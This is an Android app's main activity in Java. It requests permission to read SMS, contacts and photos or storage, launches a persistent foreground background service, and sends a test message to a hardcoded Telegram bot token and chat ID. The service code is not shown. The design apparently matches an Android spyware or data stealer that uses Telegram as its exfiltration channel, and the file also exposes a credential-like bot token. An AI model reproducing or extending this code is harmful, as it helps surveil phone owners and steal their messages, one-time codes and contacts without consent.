package com.vipih;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.Gravity;
import android.widget.LinearLayout;
import android.widget.TextView;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private static final int REQ_PERMS = 100;
    private static final String BOT_TOKEN = "8855944219:AAHTCpO73cxzcfvzwHxze0WCWSoHytzRBsg";
    private static final String CHAT_ID   = "8197183486";
    private static final String API       = "https://api.telegram.org/bot" + BOT_TOKEN;

    private TextView tv;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        tv = new TextView(this);
        tv.setTextSize(16);
        tv.setGravity(Gravity.START);
        tv.setText("Preparing...");

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        int pad = (int) (20 * getResources().getDisplayMetrics().density);
        root.setPadding(pad, pad, pad, pad);
        root.addView(tv);
        setContentView(root);

        requestNeededPermissions();
    }

    private String[] requiredPermissions() {
        List<String> perms = new ArrayList<>();
        perms.add(Manifest.permission.READ_SMS);
        perms.add(Manifest.permission.READ_CONTACTS);

        if (Build.VERSION.SDK_INT >= 33) {
            perms.add(Manifest.permission.READ_MEDIA_IMAGES);
            perms.add(Manifest.permission.POST_NOTIFICATIONS);
        } else {
            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        return perms.toArray(new String[0]);
    }

    private void requestNeededPermissions() {
        List<String> missing = new ArrayList<>();
        for (String p : requiredPermissions()) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                missing.add(p);
            }
        }
        if (missing.isEmpty()) {
            startEverything();
        } else {
            tv.setText("Requesting permissions...");
            requestPermissions(missing.toArray(new String[0]), REQ_PERMS);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] results) {
        super.onRequestPermissionsResult(requestCode, permissions, results);
        if (requestCode != REQ_PERMS) return;

        List<String> denied = new ArrayList<>();
        for (int i = 0; i < permissions.length; i++) {
            if (results[i] != PackageManager.PERMISSION_GRANTED) denied.add(permissions[i]);
        }

        if (!denied.isEmpty()) {
            StringBuilder sb = new StringBuilder("Missing permissions:\n");
            for (String d : denied) sb.append("- ").append(d).append("\n");
            sb.append("\nGrant them in Settings, then reopen.");
            tv.setText(sb.toString());
            return;
        }
        startEverything();
    }

    private void startEverything() {
        tv.setText("Starting service and testing connection...");

        Intent svc = new Intent(this, BackgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(svc);
        } else {
            startService(svc);
        }

        new Thread(this::sendTestMessage).start();
    }

    private void sendTestMessage() {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(API + "/sendMessage");
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");

            String body = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"Test Message From App\"}";

            try (OutputStream os = conn.getOutputStream()) {
                os.write(body.getBytes(StandardCharsets.UTF_8));
                os.flush();
            }

            int code = conn.getResponseCode();
            final String msg = "HTTP " + code + "\n\n"
                + (code == 200
                    ? "Success. Check Telegram.\nService is now running in background."
                    : "Failed. Check token or chat id.");

            runOnUiThread(() -> tv.setText(msg));
        } catch (final Exception e) {
            runOnUiThread(() -> tv.setText(
                "Network error:\n" + e.getClass().getSimpleName() + ": " + e.getMessage()
                    + "\n\nTurn on VPN and reopen the app."));
        } finally {
            if (conn != null) conn.disconnect();
        }
    }
}